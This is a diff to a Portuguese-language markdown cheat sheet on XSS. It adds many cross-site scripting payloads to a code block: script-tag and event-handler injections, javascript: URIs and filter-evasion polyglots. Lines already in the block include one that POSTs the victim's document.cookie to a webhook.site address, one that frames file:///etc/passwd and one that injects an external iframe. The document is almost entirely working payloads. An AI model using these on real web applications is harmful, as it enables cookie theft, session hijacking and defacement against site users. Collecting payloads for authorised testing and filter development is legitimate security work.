@@ -11,10 +11,27 @@ Existem **três tipos principais** de vulnerabilidades XSS:
 ### Exemplos simples de payloads:
 
 ```html
+<script>alert(1)</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+" onmouseover=alert(1) x="
+' onfocus=alert(1) autofocus '
 <script>alert(window.origin)</script>
 <plaintext>
 <script>print()</script>
 <img src="" onerror=alert(window.origin)>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+javascript:alert(1)
+JaVaScRiPt:alert(1)
+javascript://%0aalert(1)
+#<img src=x onerror=alert(1)>
+?x=<img src=x onerror=alert(1)>
+`;alert(1);//
+onerror=alert`1`
+jaVasCript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>
 <html%0aonpoIntEreNtER+=+[8].find(confirm)//>
 <details%09ontoGGle%09=%09[8].find(confirm)%0dx//>
 /language?destination=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTUE9TRUQnKTwvc2NyaXB0Pg==
@@ -22,6 +39,8 @@ Existem **três tipos principais** de vulnerabilidades XSS:
 <script>fetch("https://webhook.site/8a54464b-651a-4ae5-9d09-d19711774bd1",{method:'POST',body:'cookie='+document.cookie});</script>
 <img src="invalid" onerror="document.body.innerHTML+='<iframe src=https://emupedia.net/emupedia-game-doom1/asmjs/ width=500 height=400></iframe>'">
 <img src="echopwn" onerror​="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
+1'});});<​/script><​script>prompt("HACKED BY \ted")<​/script>
+
 
 ```
 Ferramenta útil: [URL/HTML Decoder - Eric Meyer](https://meyerweb.com/eric/tools/dencoder/)
